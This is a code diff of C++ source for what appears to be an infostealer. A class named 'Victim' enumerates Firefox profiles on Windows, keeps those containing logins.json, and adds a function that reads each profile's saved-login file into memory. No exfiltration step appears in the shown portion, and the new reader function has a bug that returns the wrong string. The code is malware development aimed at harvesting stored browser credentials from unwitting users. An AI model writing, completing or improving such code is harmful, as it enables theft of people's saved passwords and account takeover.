@@ -13,28 +13,34 @@ bool Victim::GetFirefoxProfiles() {
 	//C:\Users\{Username}\AppData\Roaming\Mozilla\Firefox\Profiles
 	try {
 		this->FirefoxProfileList = this->GetFirefoxProfilesList(this->p_FirefoxAppData);
-		for (int i = 0; i < this->FirefoxProfileList.size();i++) {
-				this->FirefoxProfileList[i] = this->GetProfileContent(this->FirefoxProfileList[i]);
-				for (std::wstring const& fileList : this->FirefoxProfileList[i].ProfileFiles) {
-					//Check File Extensions **Not needed for now so commenting out**
-					dotIterator = fileList.rfind('.', fileList.length());
-					if (dotIterator != std::string::npos) {
-						//std::wstring extension = fileList.substr(dotIterator + 1, fileList.length() - dotIterator);
-						if (fileList == L"logins.json") {
-							//everything good
-							containLogins = true;
-						}
+		for (int i = 0; i < this->FirefoxProfileList.size(); i++) {
+			this->FirefoxProfileList[i] = this->GetProfileContent(this->FirefoxProfileList[i]);
+			for (std::wstring const& fileList : this->FirefoxProfileList[i].ProfileFiles) {
+				//Check File Extensions **Not needed for now so commenting out**
+				dotIterator = fileList.rfind('.', fileList.length());
+				if (dotIterator != std::string::npos) {
+					//std::wstring extension = fileList.substr(dotIterator + 1, fileList.length() - dotIterator);
+					if (fileList == L"logins.json") {
+						//everything good
+						containLogins = true;
 					}
 				}
-				if (!containLogins) {
-	#ifdef _DEBUG
-					std::wcout << L"Erasing profile : " << this->FirefoxProfileList[i].profileName << std::endl;
-					std::wcout << L"Reason : DOES NOT CONTAIN ANY LOGINS INFORMATIONS" << std::endl;
-	#endif
-					this->FirefoxProfileList.erase(this->FirefoxProfileList.begin() + i);
-				}
+			}
+			if (!containLogins) {
+#ifdef _DEBUG
+				std::wcout << L"Erasing profile : " << this->FirefoxProfileList[i].profileName << std::endl;
+				std::wcout << L"Reason : DOES NOT CONTAIN ANY LOGINS INFORMATIONS" << std::endl;
+#endif
+				this->FirefoxProfileList.erase(this->FirefoxProfileList.begin() + i);
+			}
 		}
-	}
+			for (int i = 0; i < this->FirefoxProfileList.size(); i++) {
+#ifdef _DEBUG
+				std::wcout << "Getting File Content of : " << this->FirefoxProfileList[i].profileName + L"\\logins.json" << std::endl;
+#endif
+				this->FirefoxProfileList[i].LoginsFileContent = this->GetProfileLoginsContent(this->FirefoxProfileList[i]);
+			}
+		}
 	catch (std::logic_error& e) {
 #ifdef _DEBUG
 		std::wcout << "LOGIC_ERROR : " << e.what() << std::endl;
@@ -55,7 +61,7 @@ bool Victim::GetFirefoxProfiles() {
 #ifdef _DEBUG
 		std::wcout << "EXCEPTION : " << e.what() << std::endl;
 #else
-	//Log to our temp log file.
+		//Log to our temp log file.
 #endif
 		return false;
 	}
@@ -63,7 +69,7 @@ bool Victim::GetFirefoxProfiles() {
 #ifdef _DEBUG
 		std::wcout << "SOMETHING ODD HAPPENED HERE EXITING THE PROGRAM !" << std::endl;
 #else
-	//Log to our temp log file.
+		//Log to our temp log file.
 #endif
 		return false;
 	}
@@ -78,13 +84,12 @@ bool Victim::GetFirefoxProfiles() {
 /// <returns>The functions returns a list of profiles</returns>
 std::vector<Profile> Browsers::GetFirefoxProfilesList(const std::wstring& p_firefox) {
 	std::vector<Profile> profileList;
-	std::wstring directory;
+	std::wstring directory = p_firefox + L"\\*";;
 	if (p_firefox.length() > 1) {
 		DWORD fileAttribute = GetFileAttributesW(p_firefox.c_str());
 		if (fileAttribute != INVALID_FILE_ATTRIBUTES && (fileAttribute & FILE_ATTRIBUTE_DIRECTORY)) {
-			WIN32_FIND_DATA ffd;
-			directory = p_firefox + L"\\*";
-			HANDLE hFind = FindFirstFile(directory.c_str(), &ffd);
+			WIN32_FIND_DATAW ffd;
+			HANDLE hFind = FindFirstFileW(directory.c_str(), &ffd);
 			do {
 				//Dynamically allocated Profile* that is used to push_back our profileList.
 				Profile* dummyProfile = new Profile;
@@ -103,7 +108,7 @@ std::vector<Profile> Browsers::GetFirefoxProfilesList(const std::wstring& p_fire
 					}
 				}
 
-			} while (FindNextFile(hFind, &ffd) != 0);
+			} while (FindNextFileW(hFind, &ffd) != 0);
 		}
 	}
 	return profileList;
@@ -118,20 +123,20 @@ std::vector<Profile> Browsers::GetFirefoxProfilesList(const std::wstring& p_fire
 /// <param name="firefoxProfiles">A Firefox Profile</param>
 /// <returns>A Firefox Profile</returns>
 Profile Browsers::GetProfileContent(Profile firefoxProfiles) {
-	WIN32_FIND_DATA ffd;
+	WIN32_FIND_DATAW ffd;
 	if (firefoxProfiles.profilePath.empty() || firefoxProfiles.profilePath.length() < 50) throw std::exception{ "Firefox path looks wrong !" };
 	else {
 		DWORD fileAttribute = GetFileAttributesW(firefoxProfiles.profilePath.c_str());
 		if (fileAttribute != INVALID_FILE_ATTRIBUTES && (fileAttribute & FILE_ATTRIBUTE_DIRECTORY)) { //Check that our path is a dir
 			std::wstring firstFile = firefoxProfiles.profilePath + L"\\*";
-			HANDLE hFind = FindFirstFile(firstFile.c_str(), &ffd);
+			HANDLE hFind = FindFirstFileW(firstFile.c_str(), &ffd);
 			do {
 				std::wstring f = ffd.cFileName;
 				if (std::wcscmp(ffd.cFileName, L".") != 0 &&
 					std::wcscmp(ffd.cFileName, L"..") != 0) {
 					if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 						//If file is a directory add it to the directories param
-						firefoxProfiles.ProfileDirectories.push_back(ffd.cFileName);
+						firefoxProfiles.ProfileDirectories.push_back((wchar_t*)ffd.cFileName);
 #ifdef _DEBUG
 						std::wcout << L"PATH : " << ffd.cFileName << std::endl;
 #endif
@@ -144,8 +149,19 @@ Profile Browsers::GetProfileContent(Profile firefoxProfiles) {
 					}
 
 				}
-			} while (FindNextFile(hFind, &ffd) != 0);
+			} while (FindNextFileW(hFind, &ffd) != 0);
 		}
 	}
 	return firefoxProfiles;
+}
+
+std::string Browsers::GetProfileLoginsContent(Profile& profileName) {
+	std::string profileContent = "";
+	std::string r_ProfileContent = "";
+	std::ifstream loginsProfileFile(profileName.profilePath + L"\\logins.json");
+	while (std::getline(loginsProfileFile, profileContent)) {
+		if (profileContent.empty()) continue;
+		r_ProfileContent.append(profileContent + "\n");
+	}
+	return profileContent;
 }
